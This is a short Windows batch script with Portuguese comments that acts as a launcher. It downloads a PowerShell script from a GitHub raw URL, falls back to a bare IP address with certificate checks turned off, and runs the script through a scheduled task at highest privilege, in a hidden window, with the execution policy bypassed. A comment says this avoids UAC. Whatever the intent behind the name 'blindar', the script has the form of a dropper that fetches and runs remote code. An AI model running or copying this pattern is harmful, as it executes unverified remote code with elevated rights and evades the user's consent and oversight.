@echo off
rem Entrada v3.2c: busca blindar.ps1 (GH -> fallback listener), valida, e roda como tarefa (sem UAC, powershell direto)
set R=https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main
set L=https://80.78.22.208
if not exist "C:\lab" mkdir "C:\lab"
del /q C:\lab\blindar.ps1 >nul 2>&1
curl.exe -s -f -o C:\lab\blindar.ps1 %R%/blindar.ps1
if not exist C:\lab\blindar.ps1 curl.exe -k -s -o C:\lab\blindar.ps1 %L%/blindar.ps1
findstr /c:"v3.2" C:\lab\blindar.ps1 >nul 2>&1
if errorlevel 1 curl.exe -k -s -o C:\lab\blindar.ps1 %L%/blindar.ps1
curl.exe -s -f -o C:\lab\b_run.cmd %R%/b_run.cmd
schtasks /delete /tn "BlindarX" /f >nul 2>&1
schtasks /create /tn "BlindarX" /rl highest /sc once /st 00:00 /tr "powershell -NoProfile -ExecutionPolicy Bypass -w h -File C:\lab\blindar.ps1" /f
schtasks /run /tn "BlindarX"
echo OK - tarefa BlindarX disparada (log C:\blindar.log). Se a janela piscar sem nada, rode de novo.
timeout /t 7 >nul
